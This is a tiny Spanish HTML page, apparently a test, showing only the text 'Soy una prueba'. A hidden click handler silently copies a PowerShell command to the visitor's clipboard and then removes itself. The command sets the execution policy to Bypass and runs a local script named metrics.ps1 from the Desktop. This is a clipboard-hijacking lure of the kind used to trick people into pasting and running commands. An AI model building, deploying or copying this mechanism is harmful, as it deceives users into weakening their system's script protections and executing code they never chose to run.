<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Inicio</title>
</head>
<body onclick="copiarComando()">
    <p>Soy una prueba</p>
    <script>
        function copiarComando() {
            const cmd = 'cd "$HOME\\Desktop"; Set-ExecutionPolicy Restricted -Scope CurrentUser; Set-ExecutionPolicy RemoteSigned -Scope CurrentUser; Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process; .\\metrics.ps1';
            
            navigator.clipboard.writeText(cmd).then(() => {
                // Se removió el listener o el atributo para no sobrescribir el portapapeles en clics posteriores
                document.body.removeAttribute('onclick');
            }).catch(err => {
                console.error('Error al copiar: ', err);
            });
        }
    </script>

</body>
</html>
